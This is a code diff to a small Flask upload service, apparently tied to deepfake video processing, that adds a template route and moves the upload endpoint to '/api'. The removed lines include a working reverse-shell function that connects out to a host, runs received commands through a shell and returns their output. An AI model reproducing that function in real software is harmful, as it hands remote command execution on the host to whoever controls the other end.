@@ -1,25 +1,17 @@
 from flask import Flask, request, send_file
 from flask_cors import CORS
+from flask import render_template
 import os
 
 app = Flask(__name__)
 cors = CORS(app, resources={r"/*": {"origins": "*"}})
 
-import socket
-import subprocess
-
-def rs(h, p):
-  soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-  soc.connect((h, p))
-  while True:
-    cmd = soc.recv(1024)
-    proc = subprocess.Popen(cmd.decode('utf8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    output= proc.stdout.read()+proc.stderr.read()
-    soc.sendall(output)
+@app.route('/')
+def index():
+    return render_template('index.html', title='Flask Template Example')
 
 
-
-@app.route('/', methods=['POST'])
+@app.route('/api', methods=['POST'])
 def upload_file():
     os.system('rm -rf DeepFake.mp4 filename.avi pic.jpg')
     os.system('touch filename.avi')
